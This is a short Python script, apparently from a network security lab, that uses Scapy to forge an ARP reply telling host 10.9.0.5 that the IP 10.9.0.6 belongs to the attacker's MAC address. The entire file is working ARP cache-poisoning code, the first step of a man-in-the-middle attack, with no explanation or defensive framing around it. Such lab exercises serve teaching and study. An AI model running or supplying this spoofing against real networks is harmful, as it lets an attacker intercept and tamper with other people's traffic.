#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_M = get_if_hwaddr("eth0")  # M's MAC (attacker)

# Construct the ARP reply
ether = Ether(src=MAC_M, dst=MAC_A)
arp = ARP(psrc=IP_B, hwsrc=MAC_M, pdst=IP_A, hwdst=MAC_A)
arp.op = 2

frame = ether/arp
sendp(frame, iface="eth0")
